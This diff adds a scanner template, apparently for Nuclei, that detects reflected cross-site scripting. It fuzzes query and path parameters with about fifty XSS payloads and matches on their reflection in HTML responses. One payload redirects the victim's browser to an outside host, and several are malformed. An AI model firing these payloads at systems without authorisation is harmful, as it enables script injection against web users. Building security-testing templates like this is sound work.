@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<del onmouseenter=\"alert(1)\">test</del>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<script>javascript:alert(1)</script>"
+        - "<pre oncopy=\"alert(1)\" contenteditable>test</pre>"
+        - "<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus> <input autofocus>"
+        - "<IMG SRC=x onerror=javascript:alert(1)>"
+        - "<script>alert(1)</script>"
+        - "&lt;del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<code style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">test</code>"
+        - "<tr draggable=\"true\" ondragleave=\"alert(1)\">test</tr>"
+        - "<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>"
+        - "<script type=\"text/javascript\">alert(1)</script>"
+        - "<menuitem onmouseup=\"alert(1)\">test</menuitem>"
+        - "<style>:target {transform: rotate(180deg);}</style><link id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<sup style=\"filter:invert(100%)\" oncopy=\"alert(1)\">test</sup>"
+        - "<style>:target {transform: rotate(180deg);}</style><div id=x style=\"transition:transform 1s\" ontransitionrun=alert(1)></div>"
+        - "<style>:target {transform: rotate(180deg);}</style><pre id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></pre>"
+        - "<details id=x tabindex=1 onbeforeactivate=alert(1)></details><input id=y autofocus>"
+        - "<template id=x tabindex=1 onfocusin=alert(1)></template><input autofocus>"
+        - "&lt;script&gt;document.oncontextmenu = function() {alert(1);};&lt;/script&gt;"
+        - "<style>@keyframes x{}</style><iframe style=\"animation-name:x\" onanimationstart=\"alert(1)\"></iframe>"
+        - "<input id=x tabindex=1 onfocusout=alert(1)></input><input id=y autofocus>"
+        - "<style>:target {color:red}</style><button id=x style=\"transition:color 2s\" ontransitionend=alert(1)></button>"
+        - "<em onclick=\"alert(1)\">test</em>"
+        - "<font size=6 id=x tabindex=1></font><input autofocus>"
+        - "<pre style=\"display:none\" oncopy=alert(1)></pre><input id=x style=\"position:absolute;\" contenteditable>copy x</input><button id=y style=\"position:absolute; top:0;\" contenteditable>paste y</button><img src=x:x></img><iframe id=z style=\"position:absolute; left:100px\" ondrop=alert(1)></iframe>"
+        - "<svg><script src=\"javascript:document.location='http://hackers-in-the-hood.com/xss'</script></a>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>"
+        - "<svg><script>javascript:alert(1)</script></svg>"
+        - "&lt;canvas&gt;&lt;!-- --&gt;"
+        - "<details oncopy=\"alert(1)\" contenteditable>test</details>"
+        - "<script id=x tabindex=1 onfocusout=alert(1)>test</script>"
+        - "<pre>\\xE2\\x80\\x8E[IMG SRC=\\xE2\\x80\\x86XSS Payload]</pre>"
+        - "<q onmouseout=\"alert(1)\">test</q>"
+        - "<p id=\"payloadbox\">test</p><input id=x tabindex=1 onactivate=alert(1)>"
+        - "<polygon points=\"50,25 75,0 100,25 125,0\" style=\"transition:transform 1s\"> <text id=x style=\"transform:rotate(180deg)\" onanimationcancel=\"alert(1)\"></text></polygon>"
+        - "<picture><source srcset=\"https://i.imgur.com/joK5p6r.jpg\" type=\"image/webp\"><img src=\"https://i.stack.imgur.com/7dZfD.png\" alt=\"XSS Payload\"></picture>"
+        - "<select oncopy=\"alert(1)\" contenteditable>test</select>"
+        - "<script>document.getElementById(\"payloadbox\").innerHTML=\"&lt;script&gt;alert(1)&lt;/script&gt;\";</script>"
+        - "<basefont style=\"behavior:url(xss\\:xlink\\;style\\:\\#keygen[onpaste]=\\\"alert(1)\\\")\" id=x></basefont><input keygen id=y onbeforepaste=\"alert(2)\"></input><menuitem id=z draggable=\"true\" ondragend=\"alert(3)\">test</menuitem>"
+        - "<style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></a>"
+        - "<input autofocus>"
+        - "<payloadbox id=x tabindex=1 onactivate=alert(1)></payloadbox>"
+        - "<script>alert(\"XSS\");</script><button id=deletebtn tabindex=1 onbeforeactivate=alert(1)></button><input id=x tabindex=2></input>"
+        - "<code><font style=\"behavior:url(x:\\x07javascript:xss.js)\"></code>"
+        - "<qdraggable id=x tabindex=1 ondragleave=alert(1)></qdraggable><input id=y autofocus>"
+        - "<html onfocusout=\"alert(1)\" contenteditable>test</html>"
+        - "<script>alert('XSS')</script>"
+        - "<mark draggable=\"true\" ondragenter=\"alert(1)\">test</mark>"
+        - "<style>:target {transition:transform 2s;}@keyframes x{from {transform: rotate(0);}to {transform: rotate(360;}}:target {animation-name:x;}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
